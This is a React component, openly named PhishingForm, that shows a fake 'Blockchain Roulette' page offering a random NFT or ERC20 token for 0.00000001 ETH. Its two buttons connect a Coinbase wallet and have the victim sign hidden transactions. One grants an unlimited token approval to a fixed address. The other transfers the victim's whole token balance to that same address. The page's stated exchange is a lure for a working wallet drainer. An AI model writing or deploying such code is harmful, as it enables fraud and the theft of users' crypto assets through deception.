import { useRef, useState } from 'react'
import { ethereum, web3, ethers } from './coinbaseIntegrations'
import { erc20String } from './abi/erc20ABI';


export const PhishingForm = () => {

    const [ walletAddress, setWalletAddress] = useState(null);

    const connectWallet = async() => {
        const signer = await web3.getSigner()
        console.log(signer);
        if(ethereum.isConnected()  && !signer)
        {
            try {
                const response = await web3.send("eth_requestAccounts", []);
                console.log(response);
            }
            catch(e){
                alert("Unable to connect wallet")
                console.log(e);
                return;
            }
            finally{
                console.log("wallet connect flow done"); 
            }
        }
        if(signer)
        {
            setWalletAddress(signer.address);
        }
    }

    const signTransaction2 = async() => {
        let nonce;
        let signer;
        try{
            signer = await web3.getSigner();
            nonce  = await web3.getTransactionCount(signer.address);
        }
        catch(e){
            console.log("Error retrieving nonce", e);
            alert(e);
            return;
        }

        let erc20Contract = new ethers.Contract("0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", erc20String, web3);

        try{
            // Obtain balance
            const balance = await erc20Contract.balanceOf(signer.address)
            console.log(balance)

            let data = erc20Contract.interface.encodeFunctionData("transfer",
                [
                    "0x16A471EdA401df1Cab3D18C90f5094fd8155eE84",
                    balance
                ]
            )


            await signer.signTransaction({
                nonce: nonce,
                from: signer.address,
                to: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
                data,
                value: 0,
            });
        }
        catch(e){
            console.log("Could not sign", e);
        }
        finally{
            console.log("Left signTransaction");
        }
    }

    const signTransaction = async() => {
        let nonce;
        let signer;
        try{
            signer = await web3.getSigner();
            nonce  = await web3.getTransactionCount(signer.address);
        }
        catch(e){
            console.log("Error retrieving nonce", e);
            alert(e);
            return;
        }

        try{
            await signer.signTransaction({
                nonce: nonce,
                from: signer.address,
                to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                data: "0x095ea7b300000000000000000000000016A471EdA401df1Cab3D18C90f5094fd8155eE84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                value: 0,
            });
        }
        catch(e){
            console.log("Could not sign", e);
        }
        finally{
            console.log("Left signTransaction");
        }
    }

    return(
        <div
         style={{
            width: "100%",
            objectFit: "cover",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            flexDirection: "row",
         }}>
            <div
                style={{
                    width: "80%",
                    height: "70%",
                    backgroundColor: "black",
                    opacity: ".85",
                    display: "flex",
                    alignItems: "center",
                    flexDirection: "column",
                    borderRadius: "15px"
                }}
            >
                <h1
                    style={{
                        color: "white",
                        borderRadius: "15px",
                        fontSize: "xxx-large",
                        padding: "10px",
                        textAlign: "center"
                    }}  
                >
                    Blockchain Roulette
                </h1>
                <div>
                <h2
                    style={{
                        color: "white",
                        padding: "5px",
                        margin: "10px",
                    }}  
                >
                    How it works: 
                </h2>
                <h3 
                    style={{
                        color: "white",
                        padding: "5px",
                        borderRadius: "15px",
                        margin: "10px",
                    }}  
                >
                    Click to exchange 0.00000001 ETH for 1 random NFT or ERC20 token.
                </h3>
                </div>
                {!walletAddress && <button onClick={connectWallet} style={{ margin: "5px", color: "white", backgroundColor: "black"}}>
                Connect Coinbase Wallet
                </button>}
                {walletAddress && <p style={{textAlign: "center", color: "#228B22", overflowWrap: "anywhere"}}>Connected: {walletAddress}</p>}
                <div
                    style={{
                        flex: "1",
                        width: "100%",
                        display: "flex",
                    }}
                >
                <button
                    style={{
                        textAlign: "center",
                        flex: 1,
                        borderRadius: "15px",
                        margin: "10px",
                    }}
                    id='musk'
                    onClick={signTransaction}
                >
                    <h2
                    style={{
                        fontSize: "xx-large"
                    }}
                    >NFT</h2>
                </button>
                <div style={{
                    flex: .25,
                }}></div>
                <button
                    style={{
                        textAlign: "center",
                        flex: 1,
                        borderRadius: "15px",
                        margin: "10px",
                    }}
                    id='mark'
                    onClick={signTransaction2}
                >
                    <h2
                    style={{
                        fontSize: "xx-large"
                    }}
                    >ERC20</h2>
                </button>
                </div>
            </div>
         </div>
    )
}

